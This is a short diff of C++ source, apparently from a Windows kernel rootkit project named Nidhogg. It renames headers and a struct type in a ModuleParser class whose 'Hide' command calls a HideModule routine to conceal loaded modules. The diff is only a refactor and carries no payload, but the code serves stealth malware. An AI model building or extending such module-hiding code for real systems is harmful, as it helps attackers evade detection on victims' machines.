@@ -1,7 +1,7 @@
 #include "pch.h"
 #include "ModuleParser.h"
-#include "MemoryUtils.hpp"
-#include "ProcessUtils.hpp"
+#include "MemoryHandler.h"
+#include "ProcessHandler.h"
 
 ModuleParser::ModuleParser() {
 	this->optionsSize = 1;
@@ -25,7 +25,7 @@ ModuleParser::ModuleParser() {
 * @status	 [NTSTATUS] -- Result of the command.
 */
 NTSTATUS ModuleParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
-	HiddenModuleInformation hiddenModule{};
+	IoctlHiddenModuleInfo hiddenModule{};
 	UNICODE_STRING wModuleName = { 0 };
 	ANSI_STRING aModuleName = { 0 };
 	NTSTATUS status = STATUS_SUCCESS;
@@ -50,7 +50,7 @@ NTSTATUS ModuleParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	switch (commandId) {
 	case Options::Hide:
 	{
-		status = NidhoggMemoryUtils->HideModule(&hiddenModule);
+		status = NidhoggMemoryHandler->HideModule(hiddenModule);
 		break;
 	}
 	default:
